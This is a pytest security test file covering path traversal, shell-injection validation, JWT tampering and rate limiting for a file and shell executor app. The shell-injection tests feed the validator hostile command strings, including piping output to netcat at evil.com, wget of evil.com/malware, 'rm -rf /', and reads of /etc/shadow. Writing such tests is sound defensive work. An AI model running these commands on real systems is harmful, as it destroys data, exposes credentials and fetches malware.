import pytest
from app.core.file_manager import FileManager
from app.core.shell_executor import ShellExecutor
from app.auth.jwt_handler import create_token, decode_token
from app.exceptions import AuthorizationError, AuthenticationError


class TestPathTraversal:
    @pytest.fixture
    def fm(self, tmp_path):
        return FileManager(allowed_paths=[str(tmp_path)])

    def test_dotdot_traversal(self, fm, tmp_path):
        with pytest.raises(AuthorizationError):
            fm.validate_path(str(tmp_path / ".." / ".." / "etc" / "passwd"))

    def test_absolute_escape(self, fm):
        with pytest.raises(AuthorizationError):
            fm.validate_path("/etc/shadow")

    def test_symlink_escape(self, fm, tmp_path):
        """Symlink pointing outside allowed paths should be blocked."""
        import os
        link = tmp_path / "evil_link"
        try:
            os.symlink("/etc/passwd", str(link))
            with pytest.raises(AuthorizationError):
                fm.validate_path(str(link))
        except OSError:
            pytest.skip("Cannot create symlinks on this system")

    def test_null_byte(self, fm, tmp_path):
        """Null bytes in path should be rejected."""
        try:
            fm.validate_path(str(tmp_path / "file\x00.txt"))
        except (AuthorizationError, ValueError):
            pass  # Either is acceptable


class TestShellInjection:
    @pytest.fixture
    def exec(self):
        return ShellExecutor(whitelist=["ls", "echo", "cat"])

    def test_semicolon(self, exec):
        with pytest.raises(AuthorizationError):
            exec.validate_command("ls; rm -rf /")

    def test_pipe(self, exec):
        with pytest.raises(AuthorizationError):
            exec.validate_command("ls | nc evil.com 1234")

    def test_and_chain(self, exec):
        with pytest.raises(AuthorizationError):
            exec.validate_command("ls && cat /etc/shadow")

    def test_or_chain(self, exec):
        with pytest.raises(AuthorizationError):
            exec.validate_command("ls || wget evil.com/malware")

    def test_backtick(self, exec):
        with pytest.raises(AuthorizationError):
            exec.validate_command("echo `whoami`")

    def test_dollar_paren(self, exec):
        with pytest.raises(AuthorizationError):
            exec.validate_command("echo $(cat /etc/passwd)")

    def test_redirect_out(self, exec):
        with pytest.raises(AuthorizationError):
            exec.validate_command("echo hack > /etc/crontab")

    def test_redirect_in(self, exec):
        with pytest.raises(AuthorizationError):
            exec.validate_command("cat < /etc/shadow")

    def test_newline_injection(self, exec):
        with pytest.raises(AuthorizationError):
            exec.validate_command("ls\nrm -rf /")

    def test_whitelist_bypass(self, exec):
        with pytest.raises(AuthorizationError):
            exec.validate_command("rm -rf /")

    def test_path_bypass(self, exec):
        with pytest.raises(AuthorizationError):
            exec.validate_command("/bin/rm -rf /")


class TestJWTSecurity:
    def test_wrong_secret(self):
        token = create_token("admin", "admin", "secret1")
        with pytest.raises(AuthenticationError):
            decode_token(token, "secret2")

    def test_tampered_token(self):
        token = create_token("admin", "admin", "secret")
        tampered = token[:-5] + "XXXXX"
        with pytest.raises(AuthenticationError):
            decode_token(tampered, "secret")

    def test_empty_token(self):
        with pytest.raises(AuthenticationError):
            decode_token("", "secret")

    def test_garbage_token(self):
        with pytest.raises(AuthenticationError):
            decode_token("not.a.jwt.token.at.all", "secret")


class TestRateLimiter:
    def test_exhaustion(self):
        from app.middleware.rate_limit import TokenBucketLimiter
        limiter = TokenBucketLimiter(rate=3, per_seconds=60)
        assert limiter.allow("attacker") is True
        assert limiter.allow("attacker") is True
        assert limiter.allow("attacker") is True
        assert limiter.allow("attacker") is False
        assert limiter.allow("attacker") is False

    def test_key_isolation(self):
        from app.middleware.rate_limit import TokenBucketLimiter
        limiter = TokenBucketLimiter(rate=1, per_seconds=60)
        assert limiter.allow("user1") is True
        assert limiter.allow("user1") is False
        assert limiter.allow("user2") is True  # different key, not affected
